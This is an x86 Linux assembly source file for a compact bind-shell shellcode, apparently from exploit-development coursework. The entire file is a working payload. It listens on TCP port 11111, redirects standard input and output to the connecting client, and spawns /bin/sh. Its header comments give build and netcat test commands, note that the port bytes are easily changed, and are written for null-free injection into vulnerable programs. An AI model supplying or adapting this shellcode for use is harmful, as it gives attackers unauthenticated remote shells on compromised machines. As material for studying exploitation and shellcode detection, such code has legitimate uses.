;   bind_shell_tcp_shellcode
;
;   * 103 bytes
;   * null-bytes free
;   * avoids SIGSEGV when reconnecting, setting SO_REUSEADDR (TIME_WAIT)
;   * the port number is easily changeable (3th and 4th bytes of the shellcode)
;
;
;   # nasm -f elf32 shell_bind_tcp_shellcode.asm -o shell_bind_tcp_shellcode.o -g
;   # ld -m elf_i386 shell_bind_tcp_shellcode.o -o shell_bind_tcp_shellcode
;   # ./shell_bind_tcp_shellcode
;
;   Testing
;   # nc 127.0.0.1 11111


global _start

section .text

_start:

	; Setting port number

	mov bp, 0x672b		; port in byte reverse order = 11111


	; Creating the socket file descriptor
	; socket(2, 1, 0)

	push 102
	pop eax
	cdq

	push 1
	pop ebx

	; socket arguments
	push edx
	push ebx
	push 2

finalint:

	mov ecx, esp
	int 0x80

	mov esi, eax		; esi now contains the socket file descriptor

    pop edi                 ; pop 2 to edi


	; Avoiding SIGSEGV when trying to reconnect before the kernel to close the socket previously opened
        ; This problem happens in most shellcodes, even in the Metasploit, because they do not care
        ; about the reuse of the socket address
	; setsockopt(sockfd, 1, 2, &socklen_t, 4)

	mov al, 102

	; setsockopt arguments
	push 4
	push esp
	push edi
	push ebx
	push esi

	mov ecx, esp

	mov bl, 14
	int 0x80


	; Biding the socket with an address type
	; bind(sockfd, [2, port, 0], 16)

	mov al, 102
	mov ebx, edi

	; sockaddr_in struct
	push edx
	push bp			; port number
	push bx

	mov ecx, esp

	; bind arguments
	push 16
	push ecx
	push esi

	mov ecx, esp

	int 0x80


	; Preparing to listen the incoming connection (passive socket)
	; listen(sockfd, 0)

	mov al, 102
	mov bl, 4

	push edx
	push esi

	mov ecx, esp

	int 0x80


	; Accepting the incoming connection
	; accept(sockfd, 0, 0)

	mov al, 102
	inc ebx

	mov [esp+8], edx

	int 0x80

	xchg eax, ebx


	; Creating a interchangeably copy of the 3 file descriptors (stdin, stdout, stderr)
	;dup2 (clientfd, fd)

	mov ecx, edi

dup_loop:
    mov al, 63
    int 0x80

    dec ecx
    jns dup_loop		; looping (2, 1, 0)


	; Finally, using execve to substitute the actual process with /bin/sh
        ; execve("/bin/sh", ["/bin/sh", 0], 0)
    mov al, 11

    push edx
    push 0x68732f2f         ; "//sh"
    push 0x6e69622f         ; "/bin"

    mov ebx, esp
    push edx
    push ebx

	jmp finalint